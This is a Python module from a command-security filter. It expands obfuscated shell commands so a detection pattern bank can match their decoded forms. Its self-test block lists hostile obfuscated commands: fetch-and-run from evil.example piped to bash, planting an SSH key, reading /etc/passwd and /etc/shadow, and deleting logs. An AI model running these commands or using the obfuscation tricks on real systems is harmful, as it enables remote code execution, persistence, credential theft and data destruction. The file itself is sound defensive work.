"""Obfuscation normalizer — expand common shell obfuscation forms so the L4
pattern bank matches their deobfuscated equivalents.

Implements:
  1. IFS substitution: ${IFS}, ${IFS%??}, ${IFS#??}  →  space
  2. Variable-splitting expansion: `a="r"; b="m"; $a$b`  →  `rm`
  3. Substitution-nesting collapse: `$(echo FOO)`, `$(printf "FOO")`,
     `$(FOO""BAR)`, backticks  →  `FOOBAR`
  4. Base64 payload inlining: `echo BASE64 | base64 -d`  →  appends the
     decoded content as a secondary string for pattern matching
  5. Hex/octal `printf` decoding: `printf '\\x72\\x6d'` or `printf '\\0143...'`
     →  appends the decoded byte string

The normalized output is an *augmented* version of the input: the original
tokens are preserved and any decoded fragments are appended. This keeps the
existing rule semantics valid (matches on the original still fire) while
allowing patterns to additionally match on the decoded form.
"""
import base64
import binascii
import re
import shlex


# -------------- IFS --------------

_IFS_PATTERNS = [
    (re.compile(r'\$\{IFS(?:[%#][^}]*)?\}'), ' '),  # ${IFS}, ${IFS%??}, ${IFS#??}
    (re.compile(r'\$IFS\b'), ' '),
]


def expand_ifs(cmd: str) -> str:
    out = cmd
    for pat, repl in _IFS_PATTERNS:
        out = pat.sub(repl, out)
    # No-brace IFS glued to next identifier ($IFSsh, $IFStoken). Bash itself
    # would treat IFSsh as a separate variable, but adversarial intent is
    # `$IFS sh` — normalize the attacker view so static analysis catches it.
    out = re.sub(r'\$IFS([A-Za-z_]\w*)', r' \1', out)
    # collapse multiple spaces
    out = re.sub(r'  +', ' ', out)
    return out


# -------------- Substitution-nesting collapse --------------

def collapse_substitution(cmd: str) -> str:
    """Iteratively collapse `$(echo X)`, `$(printf "X")`, backticks, and
    adjacent empty-string concatenations like `c""url` → `curl`. Applied
    until fixed point or 10 iterations.

    Handles mixed nested forms — `$(echo c)$(echo url)` → `curl`; backticks
    inside `$()` and vice versa; printf `%s` with literal/variable args.
    """
    out = cmd
    for _ in range(10):
        prev = out
        # `printf "TOK"` and `echo TOK` (backtick form) → TOK
        out = re.sub(r'`\s*echo\s+([A-Za-z0-9_./@:\-]+)\s*`', r'\1', out)
        out = re.sub(r"`\s*printf\s+['\"]([A-Za-z0-9_./@:\-]+)['\"]\s*`", r'\1', out)
        # $(echo TOK) → TOK
        out = re.sub(r'\$\(\s*echo\s+([A-Za-z0-9_./@:\-]+)\s*\)', r'\1', out)
        # $(printf "TOK") → TOK   (literal token)
        out = re.sub(r'\$\(\s*printf\s+["\']([A-Za-z0-9_./@:\-]+)["\']\s*\)', r'\1', out)
        # $(printf "%s" TOK)  / $(printf '%s' TOK)  → TOK
        out = re.sub(r'\$\(\s*printf\s+["\']%s["\']\s+([A-Za-z0-9_./@:\-]+)\s*\)', r'\1', out)
        # $(printf "%s" $VAR) → $VAR
        out = re.sub(r'\$\(\s*printf\s+["\']%s["\']\s+(\$\w+)\s*\)', r'\1', out)
        # $(TOK""MORE) / $(TOK''MORE) → TOKMORE
        out = re.sub(r'\$\(\s*([A-Za-z0-9_./@:\-]+)(?:""|\'\')([A-Za-z0-9_./@:\-]+)\s*\)',
                     r'\1\2', out)
        # Adjacent $()-results glued by empty quotes:  X""Y → XY ; X''Y → XY
        out = re.sub(r'([A-Za-z0-9_./@:\-]+)(?:""|\'\')([A-Za-z0-9_./@:\-]+)', r'\1\2', out)
        # Trim leftover empty $() / `` after inner collapse
        out = re.sub(r'\$\(\s*\)|``', '', out)
        if out == prev:
            break
    return out


# -------------- Variable-splitting expansion --------------

def expand_variables(cmd: str) -> str:
    """Parse simple `var="value"` assignments in the same command and
    substitute them into later `$var` references. Handles the pattern
    `_z0="cur"; _z1="l"; $_z0$_z1 -fsSL URL`.  Returns cmd with
    assignments resolved and left-in-place."""
    assigns = {}
    # Match name="value" or name='value' or name=value (unquoted word)
    for m in re.finditer(r'(?:^|;|\s|&&|\|\|)\s*([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|\'([^\']*)\'|([^\s;|&]+))', cmd):
        name = m.group(1)
        val  = m.group(3) if m.group(3) is not None else (m.group(4) if m.group(4) is not None else m.group(5))
        if val is None:
            continue
        # ignore very long values / values with special shell metachars
        if len(val) > 40 or any(c in val for c in '()[]<>|&;\\'):
            continue
        assigns[name] = val
    if not assigns:
        return cmd

    def _sub(m):
        return assigns.get(m.group(1), m.group(0))

    # Substitute $var and ${var} references. Run twice to handle adjacent refs.
    out = cmd
    for _ in range(2):
        out = re.sub(r'\$\{([A-Za-z_][A-Za-z0-9_]*)\}', _sub, out)
        out = re.sub(r'\$([A-Za-z_][A-Za-z0-9_]*)', _sub, out)
    return out


# -------------- Base64 payload inlining --------------

_B64_CANDIDATE = re.compile(r'\b[A-Za-z0-9+/]{12,}={0,2}\b')


def inline_base64_payloads(cmd: str) -> str:
    """For each sufficiently long base64-looking token, try to decode and
    append the decoded string. Also handle `base64.b64decode('...')` inside
    Python one-liners."""
    out = cmd
    # Python-one-liner pattern: base64.b64decode('...')
    for m in re.finditer(r"base64\.b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]", cmd):
        try:
            dec = base64.b64decode(m.group(1), validate=True).decode('utf-8', errors='ignore')
            if dec.isprintable() or any(c in dec for c in '\n\t'):
                out += f' \x1f<PY_B64>{dec}</PY_B64>\x1f'
        except (binascii.Error, ValueError, UnicodeDecodeError):
            continue
    # Generic base64 followed by pipe to base64 -d or similar context
    if re.search(r'\bbase64\s+(-d|--decode)\b', cmd):
        for m in _B64_CANDIDATE.finditer(cmd):
            s = m.group(0)
            if len(s) < 12 or len(s) % 4 != 0:
                continue
            try:
                dec = base64.b64decode(s, validate=True).decode('utf-8', errors='ignore')
                if dec and all(c.isprintable() or c in '\n\t ' for c in dec):
                    out += f' \x1f<B64DEC>{dec}</B64DEC>\x1f'
            except (binascii.Error, ValueError, UnicodeDecodeError):
                continue
    return out


# -------------- Hex / octal printf decoding --------------

def decode_printf_escapes(cmd: str) -> str:
    """Scan for `printf '...' | sh` patterns and append the decoded bytes."""
    out = cmd
    # hex \xNN sequences
    for m in re.finditer(r"printf\s+['\"]((?:\\x[0-9a-fA-F]{2})+)['\"]", cmd):
        hex_seq = re.findall(r'\\x([0-9a-fA-F]{2})', m.group(1))
        try:
            dec = bytes.fromhex(''.join(hex_seq)).decode('utf-8', errors='ignore')
            if dec:
                out += f' \x1f<HEXDEC>{dec}</HEXDEC>\x1f'
        except ValueError:
            continue
    # octal \0NNN sequences
    for m in re.finditer(r"printf\s+['\"]((?:\\0[0-7]{2,3})+)['\"]", cmd):
        oct_seq = re.findall(r'\\0([0-7]{2,3})', m.group(1))
        try:
            bs = bytes(int(o, 8) for o in oct_seq)
            dec = bs.decode('utf-8', errors='ignore')
            if dec:
                out += f' \x1f<OCTDEC>{dec}</OCTDEC>\x1f'
        except ValueError:
            continue
    return out


# -------------- Shell-wrapper unwrap --------------

_SHELL_NAMES = {'sh', 'bash', 'dash', 'zsh', 'ash', 'ksh'}


def unwrap_shell_c(cmd: str) -> str:
    """When a command is wrapped as `sh -c '<inner>'` (or bash|dash|zsh|busybox
    variants), the outer head hides the real command. Use shlex to tokenize
    (handles the `'\\''` escape pattern from shlex.quote) and append the inner
    body as an additional marker so head-sensitive layers (path, semantic) see
    the dangerous verb."""
    try:
        toks = shlex.split(cmd, posix=True)
    except ValueError:
        return cmd          # unterminated quote / parse error → bail out
    out = cmd
    i = 0
    while i < len(toks):
        t = toks[i]
        # Form A: `<shell> -c '<inner>'`
        if t in _SHELL_NAMES and i + 2 < len(toks) and toks[i + 1].startswith('-') and 'c' in toks[i + 1]:
            inner = toks[i + 2]
            if inner and 0 < len(inner) < 4000:
                out += f' \x1f<SHELL_C>{inner}</SHELL_C>\x1f'
            i += 3
            continue
        # Form B: `busybox <shell-or-nothing> -c '<inner>'`
        if t == 'busybox':
            # busybox sh -c '...' OR busybox -c '...' (ash applet default)
            j = i + 1
            if j < len(toks) and toks[j] in _SHELL_NAMES:
                j += 1
            if j + 1 < len(toks) and toks[j].startswith('-') and 'c' in toks[j]:
                inner = toks[j + 1]
                if inner and 0 < len(inner) < 4000:
                    out += f' \x1f<SHELL_C>{inner}</SHELL_C>\x1f'
                i = j + 2
                continue
        i += 1
    return out


# -------------- Public pipeline --------------

def normalize(cmd: str) -> str:
    """Run the full normalization pipeline. Returns an augmented string."""
    x = expand_ifs(cmd)
    x = expand_variables(x)
    x = collapse_substitution(x)
    x = inline_base64_payloads(x)
    x = decode_printf_escapes(x)
    x = unwrap_shell_c(x)
    return x


if __name__ == '__main__':
    tests = [
        'rm${IFS}-rf${IFS}/tmp',
        'echo${IFS}"ssh-rsa${IFS}AAA"${IFS}>>${IFS}~/.ssh/authorized_keys',
        '_z0="cur";_z1="l";$_z0$_z1 -fsSL http://evil.example/i | sudo bash',
        '$(echo curl) -s http://evil.example/payload | bash',
        '$(c""url) -fsSL http://evil.example',
        "python3 -c \"import base64,os;os.system(base64.b64decode('Y2F0IC9ldGMvcGFzc3dk').decode())\"",
        "printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\\x76\\x61\\x72\\x2f\\x6c\\x6f\\x67\\x2f\\x2a' | sh",
        "printf '\\0143\\0141\\0164\\040\\057\\0145\\0164\\0143\\057\\0163\\0150\\0141\\0144\\0157\\0167' | sh",
    ]
    for t in tests:
        n = normalize(t)
        print(f'IN : {t[:120]}')
        print(f'OUT: {n[:200]}')
        print()
